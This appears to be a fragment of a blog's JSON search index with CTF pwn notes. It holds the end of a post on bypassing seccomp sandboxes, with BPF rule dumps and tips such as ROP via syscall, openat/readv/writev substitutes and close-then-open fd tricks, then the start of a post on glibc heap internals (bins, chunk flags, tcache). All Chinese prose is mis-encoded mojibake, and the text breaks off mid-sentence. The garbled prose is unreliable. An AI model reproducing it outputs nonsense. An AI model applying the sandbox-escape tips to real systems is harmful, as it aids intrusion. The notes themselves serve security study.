ˆå†æ¥ROPï¼Œå…¶å®å’Œshellcodeå·®ä¸å¤šçš„ã€‚è¿™ç§æƒ…å†µä¸€èˆ¬æ˜¯ç¦ç”¨äº†mprotectï¼Œæ‰€ä»¥æ²¡åŠæ³•ç›´æ¥ä½¿ç”¨shellcodeäº†ï¼Œé‚£ä¹ˆå°±åˆ©ç”¨ROPæ¥æï¼Œå€ŸåŠ©libcä¸Šçš„syscallã€‚ä½†æ˜¯è¿™é‡Œçš„openä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰æ—¶å€™æ‰§è¡Œä¸äº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å€ŸåŠ©syscallåŠ ä¸Šopençš„ç³»ç»Ÿè°ƒç”¨å·æ¥æ‰§è¡Œopenã€‚\n\nå¦‚æœæ²¡æœ‰ç¦æ­¢mprotectï¼Œé‚£ä¹ˆé€šå¸¸å¯ä»¥é…åˆSigreturnFrame()ï¼Œfree_hookï¼Œsetcontextæ¥å°†å †ä¸Šå†…å­˜æƒé™æ”¹ä¸ºå¯æ‰§è¡Œï¼Œç„¶åå†åœ¨å †ä¸Šä½¿ç”¨shellcodeä¹Ÿå¯ä»¥ã€‚\n\nâ–²æœ‰äº›ç¦ç”¨äº†open,write,readï¼Œé‚£ä¹ˆå…¶å®è¿™ç§æƒ…å†µä¸‹å¯ä»¥è°ƒç”¨å¯¹åº”çš„openatï¼Œreadvï¼Œå’Œwritevï¼Œå…¶å®æ•ˆæœä¸€æ ·çš„ï¼Œå› ä¸ºå‰é¢ä¸‰ä¸ªå‡½æ•°å…¶å®éƒ½å¯¹åº”è°ƒç”¨åé¢çš„ä¸‰ä¸ªå‡½æ•°ã€‚å¦‚æœå®åœ¨æ²¡åŠæ³•æ‰“å°ï¼Œå¯ä»¥åˆ©ç”¨é¢˜ç›®ä¸­çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºï¼Œä¿®æ”¹IO_FILEæ¥æ‰“å°ï¼Œè¯»å–ã€‚è¿˜æœ‰æ›´å¼ºçš„ç”¨ptraceä¿®æ”¹ç³»ç»Ÿè°ƒç”¨å·ï¼Œzer0pts CTF2020çš„sycall kitã€‚å®åœ¨æ‰¾ä¸åˆ°ï¼Œåé¢å†è¡¥å‘å§ã€‚\n\n(3)æ§åˆ¶äº†open,write,readçš„å‚æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x0b 0xc000003e if (A != ARCH_X86_64) goto 0013\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x08 0xffffffff if (A != 0xffffffff) goto 0013\n0005: 0x15 0x06 0x00 0x00000002 if (A == open) goto 0012\n0006: 0x15 0x00 0x06 0x00000000 if (A != read) goto 0013\n0007: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0008: 0x25 0x03 0x00 0x00000000 if (A > 0x0) goto 0012\n0009: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0013\n0010: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0011: 0x35 0x00 0x01 0x00000004 if (A < 0x4) goto 0013\n0012: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0013: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\n \n\n```\n#æ³¨é‡Šå¤´\n\n0000: 0x20 0x00 0x00 0x00000004 A = arch\n0001: 0x15 0x00 0x12 0xc000003e if (A != ARCH_X86_64) goto 0020\n0002: 0x20 0x00 0x00 0x00000000 A = sys_number\n0003: 0x35 0x00 0x01 0x40000000 if (A < 0x40000000) goto 0005\n0004: 0x15 0x00 0x0f 0xffffffff if (A != 0xffffffff) goto 0020\n0005: 0x15 0x0d 0x00 0x00000002 if (A == open) goto 0019\n0006: 0x15 0x0c 0x00 0x00000003 if (A == close) goto 0019\n0007: 0x15 0x0b 0x00 0x0000000a if (A == mprotect) goto 0019\n0008: 0x15 0x0a 0x00 0x000000e7 if (A == exit_group) goto 0019\n0009: 0x15 0x00 0x04 0x00000000 if (A != read) goto 0014\n0010: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # read(fd, buf, count)\n0011: 0x15 0x00 0x08 0x00000000 if (A != 0x0) goto 0020\n0012: 0x20 0x00 0x00 0x00000010 A = fd # read(fd, buf, count)\n0013: 0x15 0x05 0x06 0x00000000 if (A == 0x0) goto 0019 else goto 0020\n0014: 0x15 0x00 0x05 0x00000001 if (A != write) goto 0020\n0015: 0x20 0x00 0x00 0x00000014 A = fd >> 32 # write(fd, buf, count)\n0016: 0x15 0x00 0x03 0x00000000 if (A != 0x0) goto 0020\n0017: 0x20 0x00 0x00 0x00000010 A = fd # write(fd, buf, count)\n0018: 0x15 0x00 0x01 0x00000001 if (A != 0x1) goto 0020\n0019: 0x06 0x00 0x00 0x7fff0000 return ALLOW\n0020: 0x06 0x00 0x00 0x00000000 return KILL\n```\n\nç±»ä¼¼è¿™ç§é™åˆ¶fdçš„ï¼Œå¯ä»¥å…ˆcloseå†openï¼Œæ”¹å˜fdï¼ŒåŒæ ·å¯¹åº”å‚æ•°ä¹Ÿå¯ä»¥é€‚å½“åšä¸€äº›ä¿®æ”¹æ¥ç»•è¿‡ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\n[seccompæ²™ç›’é€ƒé€¸åŸºç¡€â€”â€”æ²™ç›’çš„è§„åˆ™ç¼–å†™ - p0lar1s - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/p0lar1s/p/14697070.html#åŸºäºbpfä¼¯å…‹åˆ©åˆ†ç»„è¿‡æ»¤å™¨çš„seccompåº“å‡½æ•°)\n\n[(*Â´âˆ‡ï½€*) è¢«ä½ å‘ç°å•¦~ seccompå­¦ä¹ ç¬”è®° | A1ex's Blog](https://a1ex.online/2020/09/27/seccompå­¦ä¹ ç¬”è®°/)\n\n[PWNé¢˜ä¸­å¸¸è§çš„seccompç»•è¿‡æ–¹æ³• - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/219077#h2-0)\n\n[Seccompä»0åˆ°1 - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)](https://www.anquanke.com/post/id/208364#h2-10)\n\nç­‰ç­‰ï¼Œè´´ä¸è¿‡æ¥äº†ã€‚\n","tags":["ORW-Skill"],"categories":["ORW"]},{"title":"å †å‰ç½®çŸ¥è¯†æ€»ç»“","url":"/2021/08/19/å †å‰ç½®çŸ¥è¯†æ€»ç»“/","content":"\n# ä¸€ã€main_arenaæ€»æ¦‚\n\n## 1.arena:\n\nå †å†…å­˜æœ¬èº«\n\n### (1)ä¸»çº¿ç¨‹çš„main_arena:\n\nç”±sbrkå‡½æ•°åˆ›å»ºã€‚\n\n- æœ€å¼€å§‹è°ƒç”¨sbrkå‡½æ•°åˆ›å»ºå¤§å°ä¸º(128 KB + chunk_size) align 4KB çš„ç©ºé—´ä½œä¸º heap\n\n- å½“tä¸å¤Ÿç”¨æ—¶ï¼Œç”¨sbrkæˆ–è€…mmapå¢åŠ heapå¤§å°ã€‚\n\n### (2)å…¶å®ƒçº¿ç¨‹çš„per thread arena:\n\nç”±mmapåˆ›å»ºã€‚\n\n- æœ€å¼€å§‹è°ƒç”¨ mmap æ˜ å°„ä¸€å—å¤§å°ä¸ºHEAP_MAX_SIZEï¼ˆ32 ä½ç³»ç»Ÿä¸Šé»˜è®¤ä¸º 1MBï¼Œ64 ä½ç³»ç»Ÿä¸Šé»˜è®¤ä¸º 64MBï¼‰çš„ç©ºé—´ä½œä¸º sub-heapã€‚\n\n- å½“ä¸å¤Ÿç”¨æ—¶ï¼Œä¼šè°ƒç”¨ mmap æ˜ å°„ä¸€å—æ–°çš„ sub-heapï¼Œä¹Ÿå°±æ˜¯å¢åŠ  top chunk çš„å¤§å°ï¼Œæ¯æ¬¡ heap å¢åŠ çš„å€¼éƒ½ä¼šå¯¹é½åˆ°4KBã€‚\n\n## 2.malloc_state:\n\nç®¡ç†arenaçš„ä¸€ä¸ªç»“æ„ï¼ŒåŒ…æ‹¬å †çŠ¶æ€ä¿¡æ¯ï¼Œbinsé“¾è¡¨ç­‰ç­‰\n\n### (1)main_arena\n\nå¯¹åº”çš„malloc_stateç»“æ„çš„å…¨å±€æŒ‡é’ˆå­˜å‚¨åœ¨glibcçš„å…¨å±€å˜é‡ä¸­\n\n(å¦‚æœå¯ä»¥æ³„éœ²malloc_stateç»“æ„ä½“çš„åœ°å€ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ³„éœ²glibcçš„åœ°å€)\n\n### (2)per thread arena\n\nå¯¹åº”çš„malloc_stateå­˜å‚¨åœ¨å„è‡ªæœ¬èº«çš„arena\n\n## 3.bins:\n\nç”¨é“¾è¡¨ç»“æ„ç®¡ç†ç©ºé—²çš„chunkå—ï¼Œé€šè¿‡freeé‡Šæ”¾è¿›å…¥çš„chunkå—(åƒåœ¾æ¡¶)\n\n## 4.chunks:\n\nä¸€èˆ¬æ„ä¹‰ä¸Šçš„å †å†…å­˜å—\n\n```c\n#æ³¨é‡Šå¤´\n\nstruct malloc_state{\nmutex_t mutex;//(ç›¸å½“äºå¤šçº¿ç¨‹çš„äº’æ–¥é”)\nint flags;//(è®°å½•åˆ†é…å™¨çš„ä¸€äº›æ ‡å¿—ï¼Œbit0 ç”¨äºæ ‡è¯†åˆ†é…åŒºæ˜¯å¦åŒ…å«è‡³å°‘ä¸€ä¸ª fast bin chunkï¼Œbit1 ç”¨äºæ ‡è¯†åˆ†é…åŒºæ˜¯å¦èƒ½è¿”å›è¿ç»­çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚)\nmfastbinptr fastbinsY[NFASTBINS];//(ä¸€ä¸ªæ•°ç»„ï¼Œé‡Œé¢çš„å…ƒç´ æ˜¯å„ä¸ªä¸åŒå¤§å°çš„fastbinsçš„é¦–åœ°å€)\nmchunkptr top;//(top chunkçš„é¦–åœ°å€)\nmchunkptr last_remainder;//(æŸäº›æƒ…å†µä¸‹åˆ‡å‰²å‰©ä¸‹æ¥çš„å †å—)\nmchunkptr bins[NBINS*2-2];\n.......................................................\nunsigned int binmap[BINMAPSIZE];//(ä»¥bitä¸ºå•ä½çš„æ•°ç»„ï¼Œå…±128bitï¼Œ16ä¸ªå­—èŠ‚ï¼Œ4ä¸ªintï¼Œç”±äºbinçš„æ•°é‡ä¸º128ï¼Œå¯¹äºè¿™é‡Œé¢çš„128bitï¼Œä¸º0è¡¨è¯¥binæ²¡ç”¨æœ‰ç©ºé—²å—ï¼Œä¸º1è¡¨æœ‰ç©ºé—²å—ã€‚é€šè¿‡å››ä¸ªintçš„å¤§å°å¯ä»¥æ‰¾å‡ºä¸åŒindexçš„binä¸­æ˜¯å¦æœ‰ç©ºé—²å—ã€‚è¿™ä¸ªåœ¨æŸäº›æ—¶å€™ä¼šç”¨åˆ°ã€‚)\n......//åé¢è¿˜æœ‰ï¼Œä¸å¤ªé‡è¦\n}\n```\n\nâ–²å†…å­˜ä¸­çš„å †æƒ…å†µï¼š\n\nå…¨å±€å˜é‡glibc:main_arena = struct malloc_state:\n\n| mutes | bin  | ..... | top  | lastremainder |\n| ----- | ---- | ----- | ---- | ------------- |\n|       |      |       |      |               |\n\n \n\n| Allocated chunk | Allocated chunk | Freechunk1 | Allocated chunk | Freechunk2 | Allocated chunk | Topchunk |\n| --------------- | --------------- | ---------- | --------------- | ---------- | --------------- | -------- |\n|                 |                 |            |                 |            |                 |          |\n\nä½åœ°å€------------------------------------------------------------- ------------------>é«˜åœ°å€\n\nç”±sbrkåˆ›å»ºçš„main_arena:\n\n- å¯ä»¥æŠŠbinä¹Ÿå½“ä½œä¸€ä¸ªchunkï¼Œä¸åŒBinsç®¡ç†ç»“æ„ä¸åŒï¼Œæœ‰å•å‘é“¾è¡¨ç®¡ç†å’ŒåŒå‘é“¾è¡¨ç®¡ç†ã€‚\n\n- topé‡Œçš„bkä¿å­˜Topchunkçš„é¦–åœ°å€ã€‚\n\n(bkå’Œfdåªç”¨äºBinsé“¾è¡¨ä¸­ï¼Œallocated_chunkä¸­æ˜¯å±äºç”¨æˆ·å¯ä»¥ä½¿ç”¨çš„å†…å®¹)\n\n \n\n \n\n \n\n# äºŒã€chunkç»“æ„ï¼š\n\n## 1.chunkçŠ¶æ€\n\n### (1)allocated_chunkï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1.png)\n\n### (2)free_chunk:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2.png)\n\n## 2.prev_sizeï¼š\n\n8å­—èŠ‚ï¼Œä¿å­˜å‰ä¸€ä¸ªchunkçš„å¤§å°ï¼Œåœ¨allocatedchunkä¸­å±äºç”¨æˆ·æ•°æ®ï¼Œå‚è€ƒä¸Šè¿°çš„å›¾ç‰‡ï¼Œfree_chunkçš„ä¸‹ä¸€ä¸ªchunkçš„pre_sizeä½ä¸ºè¯¥free_chunkçš„sizeã€‚\n\n## 3.size:\n\n### (1)sizeå«ä¹‰\n\n8å­—èŠ‚ï¼Œä¿å­˜å½“å‰chunkå¤§å°ã€‚(freeå’Œallocatedéƒ½æœ‰ç”¨)ä¸€ä¸ªchunkçš„sizeä»¥0x10é€’å¢ï¼Œä»¥0x20ä¸ºæœ€å°chunkã€‚\n\n- malloc(0x01)ï¼šä¼šæœ‰0x20è¿™ä¹ˆå¤§ï¼Œå®é™…ç”¨æˆ·å¯ç”¨æ•°æ®å°±æ˜¯0x18ã€‚size=0x21\n\n- malloc(0x01-0x18)ï¼šä»ç„¶0x20è¿™ä¹ˆå¤§ï¼Œå®é™…ç”¨æˆ·å¯ç”¨æ•°æ®å°±æ˜¯0x18ã€‚size=0x21\n\n- malloc(0x18)ï¼šä¼šæœ‰0x30è¿™ä¹ˆå¤§ï¼Œå®é™…ç”¨æˆ·å¯ç”¨æ•°æ®æ˜¯0x28ã€‚size=0x31\n\næ‰€ä»¥sizeè¿™ä¸ª8å­—èŠ‚å†…å­˜çš„æœ€ä½4ä½éƒ½ä¸ä¼šè¢«ç”¨åˆ°ï¼Œæ‰€ä»¥mallocç®¡ç†æœºåˆ¶ç»™æœ€ä½çš„3ä½æäº†ä¸ªç‰¹æ®Šå½¢å¼æ ‡å¿—ä½ï¼ŒA,M,Pï¼Œåˆ†åˆ«ä»£è¡¨ä¸åŒå†…å®¹ã€‚\n\n### (2)AMPæ ‡å¿—ä½\n\n#### â‘ A:NON_MAIN_ARENA\n\nä»£è¡¨æ˜¯å¦å±äºémain_arenaï¼Œ1è¡¨æ˜¯ï¼Œ0è¡¨å¦ã€‚å°±æ˜¯çº¿ç¨‹çš„ä¸åŒã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\n#define chunk_non_main_arena(p) ((p)->size & NON_MAIN_ARENA)\n```\n\n#### â‘¡M:IS_MMAPPED\n\nä»£è¡¨å½“å‰chunkæ˜¯å¦æ˜¯mmapå‡ºæ¥çš„ã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\n#define chunk_is_mmapped(p) ((p)->size & IS_MMAPPED)\n```\n\n#### â‘¢P:PREV_INUSE\n\nä»£è¡¨å‰ä¸€ä¸ªchunkæ˜¯å¦æ­£åœ¨è¢«ä½¿ç”¨ï¼Œå¤„äºallocatedè¿˜æ˜¯freeã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\n#define prev_inuse(p) ((p)->size & PREV_INUSE)\n```\n\n(æ ‡å¿—ä½ä¸º1éƒ½ä»£è¡¨æ˜¯ï¼Œ0éƒ½ä»£è¡¨å¦)\n\n \n\n# ä¸‰ã€binsç»“æ„ï¼š\n\n## 1.fastbins\n\næ”¾åœ¨struct malloc_stateä¸­çš„mfastbinptr fastbinsY[NFASTBINS]æ•°ç»„ä¸­ã€‚\n\n### (1)å½’ç±»æ–¹å¼ï¼š\n\nåªä½¿ç”¨fdä½\n\n- binçš„indexä¸º1ï¼Œbins[0],bins[1]ç»„æˆä¸€ä¸ªbinã€‚\n\n- è§„å®šå¤§å°çš„chunkå½’åˆ°ä¸€ç±»ï¼Œä½†ä¸ªæ•°æœ‰é™ï¼Œä¸åŒç‰ˆæœ¬ä¸åŒï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥è®¾ç½®å…¶èŒƒå›´ï¼š\n\nM_MXFASTå³ä¸ºå…¶æœ€å¤§çš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡ mallopt()è¿›è¡Œè®¾ç½®ï¼Œä½†æœ€å¤§åªèƒ½æ˜¯80Bã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.jpg)\n\n### (2)å•å‘é“¾è¡¨ï¼š\n\nâ–²ä¾‹å­ï¼ša=malloc(0x10); b=malloc(0x10); c=malloc(0x10); d=malloc(0x10)\n\nFastbinY,d,c,b,a\n\n- free(a)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->a;       a.fd=0\n```\n\n- free(b)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->b;       b.fd=a       a.fd=0\n```\n\n- free(c)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->c;        c.fd=b       b.fd->a;    a.fd=0\n```\n\n- free(d)ä¹‹åï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nfastbinY[0x20]->d;       d.fd=c       c.fd->b;     b.fd->a;    a.fd=0\n```\n\n### (3)åè¿›å…ˆå‡ºï¼š\n\n- m=malloc(0x10):      m->d\n\n- n=malloc(0x10):      n->c\n\n### (4)IN_USEä½:\n\nå¦‚æœæŸä¸ªchunkè¿›å…¥åˆ°fastbinä¸­ï¼Œé‚£ä¹ˆè¯¥chunkçš„ä¸‹ä¸€ä¸ªchunkçš„IN_USEä½è¿˜æ˜¯ä¸º1ï¼Œä¸ä¼šæ”¹å˜æˆ0ã€‚\n\nä¾‹å­ï¼ša=malloc(0x10); b=malloc(0x10); c=malloc(0x10);\n\n- free(a)ä¹‹å:     b.p=1\n\n- free(b)ä¹‹åï¼š   c.p=1;   b.p=1\n\npä½ä¸ä¼šå˜æˆ0ï¼Œå¦‚æœè¯¥chunkè¿›å…¥åˆ°fastbinsä¸­ã€‚\n\nå¯ä»¥è¿›è¡Œfree(0),free(1),free(0)ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥free(0)ä¸¤æ¬¡ã€‚\n\n### (5)æ³¨æ„\n\né™¤äº†`malloc_consolidate`å‡½æ•°ä¼šæ¸…ç©ºfastbinsï¼Œä»¥åŠåœ¨tcacheä¸‹å­˜åœ¨`fastbin_reverseTo_tcache`å¤–ï¼Œå…¶å®ƒçš„æ“ä½œéƒ½ä¸ä¼šå‡å°‘fastbinsä¸­chunkçš„æ•°é‡ã€‚\n\n \n\n \n\n## 2.smallbins:\n\næ”¾åœ¨bins[2]-bins[125]ä¸­ï¼Œå…±è®¡62ç»„ï¼Œæ˜¯ä¸€ä¸ªåŒå‘é“¾è¡¨ã€‚æœ€å¤§chunkçš„å¤§å°ä¸è¶…è¿‡1024å­—èŠ‚\n\n### (1)å½’ç±»æ–¹å¼ï¼š\n\n- ç›¸åŒå¤§å°çš„chunkå½’åˆ°ä¸€ç±»ï¼šå¤§å°èŒƒå›´[0x20,0x3f0]ï¼Œ0x20ã€0x30ã€....0x3f0ã€‚æ¯ç»„binsä¸­çš„chunkå¤§å°ä¸€å®šã€‚\n\n- æ¯ç»„binä¸­çš„chunkå¤§å°æœ‰å¦‚ä¸‹å…³ç³»ï¼šChunk_size=2 * SIZE_SZ * indexï¼Œindexå³ä¸º2-63ï¼Œä¸‹å›¾ä¸­64å³ä¸ºlargebinsçš„èŒƒå›´äº†ã€‚(SIZE_SZåœ¨32ï¼Œ64ä½ä¸‹åˆ†åˆ«ä½4ï¼Œ8ã€‚)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs4.jpg)\n\n### (2)åŒå‘é“¾è¡¨ï¼š\n\nâ–²ä¾‹å­ï¼ša=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\n- free(a)ä¹‹å:      smallbin,a\n\n```c\n#æ³¨é‡Šå¤´\n\nsmallbin.bk->a;         a.bk->smallbin;      \nsamllbin.fd->a          a.fd->smallbin;\n```\n\n- free(b)ä¹‹å:    smallbin,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nsmallbin.bk->a;       a.bk->b    b.bk->smallbin\nsmallbin.fd->b;       b.fd->a    a.fd->smallbin\n```\n\n- free(c)ä¹‹åï¼š   smallbin,c,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nsmallbin.bk->a;       a.bk->b    b.bk->c    c.bk->smallbin\nsmallbin.fd->c;       c.fd->b    b.fd->a    a.fd->smallbin\n```\n\nï¼ˆfd,bkä¸ºbins[n]ï¼Œbins[n+1]ã€‚fdå’Œbkå…±åŒæ„æˆä¸€ä¸ªBinatã€‚ï¼‰\n\n### (3)å…ˆè¿›å…ˆå‡ºï¼š\n\n- m=malloc(0x100):         m->a\n\n- n=malloc(0x100):         n->b\n\n \n\n \n\n## 3.largebins\n\næ”¾åœ¨bins[126]-bins[251]ï¼Œå…±è®¡63ç»„ï¼Œbinçš„indexä¸º64-126ï¼Œæœ€å°chunkçš„å¤§å°ä¸å°äº1024ä¸ªå­—èŠ‚ã€‚\n\n### (1)å½’ç±»æ–¹å¼ï¼š\n\nèŒƒå›´å½’ç±»ï¼Œä¾‹å¦‚bins[126]-bins[127]ä¸­ä¿å­˜chunkèŒƒå›´åœ¨[0x400,0x440]ã€‚ä¸”chunkåœ¨ä¸€ä¸ªbinä¸­æŒ‰ç…§ä»å¤§åˆ°å°æ’åºï¼Œä¾¿äºæ£€ç´¢ã€‚å…¶å®ƒä¸smallbinsåŸºæœ¬ä¸€è‡´ã€‚\n\n#### â‘ èŒƒå›´æ¨¡å¼ï¼š\n\nç”±ä»¥ä¸‹ä»£ç å®šä¹‰èŒƒå›´ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\n#define largebin_index_64(sz)                                               \n  (((((unsigned long) (sz)) >> 6) <= 48) ?  48 + (((unsigned long) (sz)) >> 6) :\n   ((((unsigned long) (sz)) >> 9) <= 20) ?  91 + (((unsigned long) (sz)) >> 9) :\n   ((((unsigned long) (sz)) >> 12) <= 10) ? 110 + (((unsigned long) (sz)) >> 12) :\n   ((((unsigned long) (sz)) >> 15) <= 4) ? 119 + (((unsigned long) (sz)) >> 15) :\n   ((((unsigned long) (sz)) >> 18) <= 2) ? 124 + (((unsigned long) (sz)) >> 18) :\n   126)\n```\n\n#### â‘¡èŒƒå›´å…·ä½“å®ä¾‹ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nsize                           index\n[0x400 , 0x440)                64\n[0x440 , 0x480)                65\n[0x480 , 0x4C0)                66\n[0x4C0 , 0x500)                67\n[0x500 , 0x540)                68\nç­‰å·® 0x40      â€¦\n[0xC00 , 0xC40)                96\n[0xC40 , 0xE00)                97\n[0xE00 , 0x1000)               98\n[0x1000 , 0x1200)              99\n[0x1200 , 0x1400)              100\n[0x1400 , 0x1600)              101\nç­‰å·® 0x200    â€¦\n[0x2800 , 0x2A00)              111\n[0x2A00 , 0x3000)              112\n[0x3000 , 0x4000)              113\n[0x4000 , 0x5000)              114\nç­‰å·® 0x1000 â€¦\n[0x9000 , 0xA000)              119\n[0xA000 , 0x10000)             120\n[0x10000 , 0x18000)            121\n[0x18000 , 0x20000)            122\n[0x20000 , 0x28000)            123\n[0x28000 , 0x40000)            124\n[0x40000 , 0x80000)            125\n[0x80000 , â€¦. )                126\n```\n\n### (2)åŒå‘é“¾è¡¨ï¼š\n\n#### â‘ å–ç”¨æ’åˆ—ï¼š\n\né¦–å…ˆä¾æ®fd_nextsizeï¼Œbk_nextsizeä¸¤ä¸ªæŒ‡é’ˆå¤§å°æ‰¾åˆ°é€‚åˆçš„ï¼Œç„¶åæŒ‰ç…§æ­£å¸¸çš„FIFOå…ˆè¿›å…ˆå‡ºåŸåˆ™ï¼Œé€šè¿‡fd,bkæ¥æ’åˆ—ã€‚\n\n#### â‘¡å¤§å°æ’åˆ—ï¼š\n\næ¯ä¸ªè¿›å…¥largebinçš„chunk\n\nå…¶chunk_addr+0x20å¤„å³ä¸ºå…¶fd_nextsizeæŒ‡é’ˆï¼Œchunk_addr+0x28å¤„ä¸ºå…¶bk_nextsizeæŒ‡é’ˆã€‚\n\nç„¶åé€šè¿‡fd_nextsizeï¼Œbk_nextsizeä¸¤ä¸ªæŒ‡é’ˆä¾æ®ä»å¤§è‡³å°çš„é¡ºåºæ’åˆ—ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs5.png)\n\n(è¿™å¼ å›¾ç‰‡æˆ‘ä¹Ÿå¿˜è®°ä»å“ªé‡Œæ•´çš„äº†...ä¾µåˆ )\n\nå…¶ä¸­sizeé¡ºåºä¸ºï¼šD>C>B>Aï¼Œä½†æ˜¯é‡Šæ”¾é¡ºåºå´ä¸ä¸€å®šæ˜¯è¿™æ ·çš„ã€‚è®¾ç½®è¿™ä¸ªçš„åŸå› æ˜¯å½“ç”³è¯·ç‰¹å®šå¤§å°çš„å †å—æ—¶ï¼Œå¯ä»¥æ®æ­¤æ¥å¿«é€ŸæŸ¥æ‰¾ï¼Œæå‡æ€§èƒ½ã€‚\n\n### (3)ç‰¹æ®Šè§£é“¾ï¼š\n\nç”±äºlargebinä¸­ä¼šå­˜åœ¨fd_nextsizeæŒ‡é’ˆå’Œbk_nextsizeæŒ‡é’ˆï¼Œæ‰€ä»¥é€šå¸¸çš„largebin_attackå°±æ˜¯é’ˆå¯¹è¿™ä¸ªè¿›è¡Œåˆ©ç”¨çš„ã€‚\n\nå€Ÿç”¨æ˜Ÿé˜‘ç§‘æŠ€çš„ä¸€å¼ å›¾è¯´æ˜ä¸€åˆ‡ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs6.jpg)\n\n \n\n \n\n## 4.unsortedbins\n\nbins[0]å’Œbins[1]ä¸­ï¼Œbins[0]ä¸ºfdï¼Œbins[1]ä¸ºbkï¼Œbinçš„indexä¸º1ï¼ŒåŒé“¾è¡¨ç»“æ„ã€‚\n\n### (1)å½’ç±»æ–¹å¼ï¼š\n\nåªæœ‰ä¸€ä¸ªbinï¼Œå­˜æ”¾æ‰€æœ‰ä¸æ»¡è¶³fastbinï¼Œæœªè¢«æ•´ç†çš„chunkã€‚\n\n### (2)åŒå‘é“¾è¡¨ï¼š\n\na=malloc(0x100); b=malloc(0x100); c=malloc(0x100)\n\n- free(a)ä¹‹å:      unsortedbin,a\n\n```c\n#æ³¨é‡Šå¤´\n\nunsortedbin.bk->a;  a.bk->unsortedbin;\nunsortedbin.fd->a;  a.fd->unsortedbin;\n```\n\n- free(b)ä¹‹å:    unsortedbin,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nunsortedbin.bk->a;  a.bk->b     b.bk->unsortedbin\nunsortedbin.fd->b;  b.fd->a     a.fd->unsortedbin\n```\n\n- free(c)ä¹‹åï¼š   unsortedbin,c,b,a\n\n```c\n#æ³¨é‡Šå¤´\n\nunsortedbin.bk->a;  a.bk->b     b.bk->c     c.bk->unsortedbin\nunsortedbin.fd->c;  c.fd->b     b.fd->a     a.fd->unsortedbin\n```\n\n### (3)å…ˆè¿›å…ˆå‡ºï¼š\n\n- m=malloc(0x100):         m->a\n\n- n=malloc(0x100):         n->b\n\nâ–²ä¾æ®fdæ¥éå†ï¼š\n\nå¦‚æœfdé“¾é¡ºåºä¸ºA->B->C\n\né‚£ä¹ˆè§£é“¾é¡ºåºä¸€å®šæ˜¯å…ˆè§£Cï¼Œå†è§£Bï¼Œå†è§£Aã€‚\n\n \n\n \n\n \n\n## 5ã€Tcacheæœºåˆ¶ï¼š\n\nä»libc-2.26åŠä»¥åéƒ½æœ‰:å…ˆè¿›åå‡ºï¼Œæœ€å¤§ä¸º0x410\n\n### (1)ç»“æ„ï¼š\n\n#### â‘ 2.29ä»¥ä¸‹\n\næ— keyå­—æ®µçš„tcacheï¼Œç»“æ„å¤§å°ä¸º0x240ï¼ŒåŒ…æ‹¬chunkå¤´åˆ™å æ®0x250:\n\n```c\n#æ³¨é‡Šå¤´\n\ntypedef struct tcache_perthread_struct\n{\n  char counts[TCACHE_MAX_BINS];//0x40\n  tcache_entry *entries[TCACHE_MAX_BINS];//0x40\n} tcache_perthread_struct;\n```\n\n##### counts:\n\næ˜¯ä¸ªæ•°ç»„ï¼Œæ€»å…±64ä¸ªå­—èŠ‚ï¼Œå¯¹åº”tcacheçš„64ä¸ªbinï¼Œæ¯ä¸ªå­—èŠ‚ä»£è¡¨å¯¹åº”binä¸­å­˜åœ¨chunkçš„ä¸ªæ•°ï¼Œæ‰€ä»¥æ¯ä¸ªå­—èŠ‚éƒ½ä¼šå°äº8ï¼Œä¸€èˆ¬ä½¿ç”¨\n\n```c\n#æ³¨é‡Šå¤´\n\ntc_idx = csize2tidx 